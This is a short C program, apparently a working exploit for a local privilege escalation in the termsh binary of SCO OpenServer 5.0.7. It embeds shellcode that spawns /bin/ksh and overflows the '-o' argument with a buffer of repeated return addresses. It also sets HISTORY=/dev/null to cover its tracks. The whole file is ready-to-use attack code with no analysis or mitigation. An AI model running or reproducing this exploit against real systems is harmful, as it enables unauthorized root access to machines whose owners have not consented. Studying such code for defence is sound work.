#include <stdio.h>
#include <stdlib.h>

char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x68\xff\xf8\xff\x3c\x6a\x65\x89"
                 "\xe6\xf7\x56\x04\xf6\x16\x31\xc0"
                 "\x50\x68""/ksh""\x68""/bin""\x89"
                 "\xe3\x50\x50\x53\xb0\x3b\xff\xd6";

int main(int argc,char* argv[])
{
        char* buffer;
        char* arg = "-o";
        char *env[] = {"HISTORY=/dev/null",NULL};
        long eip,ptr;
        int i;
       printf("[ SCO Openserver 5.0.7 termsh local privilege escalation
exploit\n");
       if(argc < 2)
       {
               printf("[ Error  : [path]\n[ Example: %s
/opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh\n",argv[0]);
               exit(0);
       }
       eip = 0xa2080853;
       buffer = malloc(7449 + strlen(shellcode));
        memset(buffer,'\x00',7449 + strlen(shellcode));
       ptr = (long)buffer + strlen(shellcode);
        strncpy(buffer,shellcode,strlen(shellcode));
       for(i = 1;i <= 1862;i++)
       {
                memcpy((char*)ptr,(char*)&eip,4);
                ptr = ptr + 4;
       }
       execle(argv[1],argv[1],arg,buffer,NULL,env);
       exit(0);
}
